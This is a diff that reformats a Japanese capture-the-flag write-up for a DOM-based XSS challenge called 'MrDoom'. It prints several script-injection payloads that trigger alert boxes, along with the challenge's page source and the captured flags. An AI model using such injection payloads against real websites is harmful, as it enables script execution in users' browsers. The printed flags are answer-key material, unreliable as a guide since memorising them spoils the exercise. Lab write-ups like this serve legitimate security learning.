@@ -1,12 +1,13 @@
-ttp://ec2-18-184-207-28.eu-central-1.compute.amazonaws.com/doom/
+# Challenge Name: MrDoom
+
+http://ec2-18-184-207-28.eu-central-1.compute.amazonaws.com/doom/
 
 </textarea><input type=text value=x onmouseover=alert('flag1')>
 とかでXSSが発火したのでXSSがあることがわかる。
 
-ソースを見る
-
+***
 ページソース
-
+~~~
 <!doctype html>
 <html>
 	<head>
@@ -143,10 +144,12 @@ ttp://ec2-18-184-207-28.eu-central-1.compute.amazonaws.com/doom/
     
 	</body>
 </html>
+~~~
 
 
-■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■
+***
 
+~~~
         <script>  
           
         var data = document.getElementById('string').value;
@@ -172,27 +175,27 @@ ttp://ec2-18-184-207-28.eu-central-1.compute.amazonaws.com/doom/
             }
             console.log(message2(data));
         </script>
-■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■    
-
+~~~
+***
 DOMベースXSSです
 
 Function1つ目
 
-'#';alert('flag1')//を入力した場合出力が下記のようになるので発火する
+###`'#';alert('flag1')//`
+を入力した場合出力が下記のようになるので発火する
 
 <script>'({"userdata":"';alert('flag1')//"}
 
 前半部分
-FLAG{th!5_!5_my_l0ng_
-
+###`FLAG{th!5_!5_my_l0ng_`
 
 Function2つ目
 
 var a = document.createElement('div');があるので<div>が生成されているため</div>で閉じる
 
-Comment#></div><script>alert('flag2')</script>と入力すると発火する
+###`Comment#></div><script>alert('flag2')</script>`と入力すると発火する
 
-Fl4g_F0r_5w33t_D0M!!}
+`Fl4g_F0r_5w33t_D0M!!}`
 
 
-FLAG{th!5_!5_my_l0ng_Fl4g_F0r_5w33t_D0M!!}
+###`FLAG{th!5_!5_my_l0ng_Fl4g_F0r_5w33t_D0M!!}`
